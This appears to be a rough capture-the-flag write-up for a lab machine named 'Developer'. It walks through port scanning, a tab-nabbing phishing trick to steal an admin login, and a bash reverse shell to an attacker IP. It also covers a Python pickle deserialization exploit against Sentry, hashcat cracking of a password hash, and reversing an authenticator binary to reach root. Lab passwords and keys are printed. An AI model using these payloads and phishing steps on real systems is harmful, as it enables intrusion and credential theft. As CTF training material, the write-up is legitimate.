> Author: **[][author-profile]**

## Discovery

### Port Scanning

TCP:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)
|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)
|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Developer: Free CTF Platform
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```

UDP:

```bash
```

### Enumeration

## System User

Clone page, then do the tab nabbing: possible with SET

Admin clicks your writeup, it opens new tab, there's nothing in that tab only junk

Then admin go back to the ctf website and they are logged out, when they log in you have password

I used https://www.revshells.com/ to pick up the appropriate revshell and copy b64encoded string right away.
/bin/bash -i >& /dev/tcp/10.10.X.X/1337 0>&1
Then I modified py script from the pdf
https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf
the last row looks like:
print (b64encode(compress(dumps(PickleExploit('bash -c "echo "b64enc string from the generator"|base64 -d|bash"')))))
that's it...

```bash
echo -n pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI= > hash.karl
hashcat -O -a 0 -m 10000 hash.karl /usr/share/wordlists/passwords/rockyou.txt
```

> karl insaneclownposse

user : jacob@developer.htb
password : SuperSecurePassword@HTB2021

## Marc to Karl

https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf
http://developer-sentry.developer.htb/admin/sentry/auditlogentry/

```bash
psql -h localhost -U ctf_admin -p'CTFOG2021' -d platform -W -e'show tables;'
```

## System Root

Debug the binary `authenticator`, break on password read.

```bash
sudo /root/.auth/authenticator
# RustForSecurity@Developer@2021:)
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDlAsQ9AWugJsOOYbb1opBuNH7DGo19PohZhmSrIfwpNCLuDyq5mLrQaAR2fOJJ+ihH8Bn5nu0F1J5nDv/pTFjJzA/hgiKubEqlFAEDpx3wladugWPqtpo2JUYMVuxzp3TA3J1/OzdFUmIBMPuYUd25cbx7CoaFJZNQpwBBKFTpQvBjWzFcKZgBWDEAFM2/aaxw3EIVHluN84a0Yx/pBmKrRaOGhD/KVw6kT9nK3NWsnsVng3Fb/5C19hdIyrcHAltYx3ShWW4k8P1XWlCY4TmIduxGD80THGkbMrXWTJQl5IUk8w/1Jj/td5BApC9cpzokLUElBER07E/K8CZf8qLfNFj4PupK36pKy3s/Y9ni6sGq2AsPC9bwhboWgXGPPZgGQElRK/iFQeKcGvKRdH6kY/GX/+ldWY2N0HnMw4Lu9ZLpE4vZB3CGCWUWMYLsf47jho2j6xTl8YdmONFeFaaVOr7+OSuY94R4wDFWqcbsXhkKi0CGMUSEXAI6dCMeYX8=
```

```bash
chmod 600 id_rsa.0xd
ssh -i id_rsa.0xd root@10.10.11.103
```

you guys have to run the binary on ur machine and then add a bp when u enter a password, then you have a secret len like:
a3e8 3234 5c79 9161 9e20 d43d bef4 f5d5
add in in cyberchef
then you have a IV
761f 59e3 d9d2 959a a798 55dc 0620 816a
MODE CTR; input in hexa and output in raw then you have your password

[author-profile]: 
